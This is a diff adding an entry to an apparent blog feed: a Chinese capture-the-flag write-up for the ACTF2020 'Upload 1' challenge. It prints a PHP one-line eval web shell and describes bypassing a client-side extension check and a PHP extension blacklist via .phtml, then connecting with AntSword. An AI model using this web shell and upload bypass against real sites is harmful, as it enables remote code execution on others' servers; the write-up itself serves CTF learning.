@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>寒假练习15</title>
+      <link href="test21/undefined-undefined.html"/>
+      <url>test21/undefined-undefined.html</url>
+      
+        <content type="html"><![CDATA[<p>昨天出去聚会，所以没有写题，明天出去有事，所以今天赶快来一道题练练手。  </p><h1 id="ACTF2020-新生赛-Upload-1"><a href="#ACTF2020-新生赛-Upload-1" class="headerlink" title="[ACTF2020 新生赛]Upload 1"></a>[ACTF2020 新生赛]Upload 1</h1><p>打开题目，可以看到让莪们上传一个文件。很明显这是一道上传木马题。<br><img src="https://i.loli.net/2021/01/30/dIEukpm58owrJKx.png" alt="64.png"><br>直接上传我们的一句话木马。  </p><blockquote><?php @eval($_POST['cmd']) ?></blockquote><p>但是却报错了。<br><img src="https://i.loli.net/2021/01/30/WcBXrUzMyohpkPN.png" alt="69.png"><br>他让我们上传的文件要以jpg,png,gif结尾。而且这个是在上传之前就检查的。所以我们要先在上传之前将文件后缀名改为.jpg或者其他，这样就可以绕过开始的前端检查，进一步进行抓包来进行更多的修改。<br>上传完文件后，抓包查看信息。<br><img src="https://i.loli.net/2021/01/30/ZY9aQzgkHvxIKRX.png" alt="70.png"><br>发现我们的文件成功上传了，可以看出网站后端没有进行更多的内容的检测，但是从上一道上传问题我们可以知道，我们上传的文件最终要是php文件，否则无法执行我们的一句话代码，所以再改一下文件类型。  </p><blockquote><p>filename=”shell.php”</p></blockquote><p>但是被拦截了。<br><img src="https://i.loli.net/2021/01/30/DBp3hFE6q4Z2lnu.png" alt="71.png"><br>说明我们不能上传php文件。那我们就绕过这个后缀。换成phtml。<br><img src="https://i.loli.net/2021/01/30/23nOYk167lZSpcv.png" alt="72.png"><br>可以看到上传成功了。接着就是剑蚁连接这个网址，别忘了需要完整的网址。<br><img src="https://i.loli.net/2021/01/30/oneBQl8h6E2MqJA.png" alt="73.png"><br>在根目录可以找到flag。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> test21 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 练习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>sql绕过方法笔记</title>
       <link href="note4/undefined-undefined.html"/>
       <url>note4/undefined-undefined.html</url>
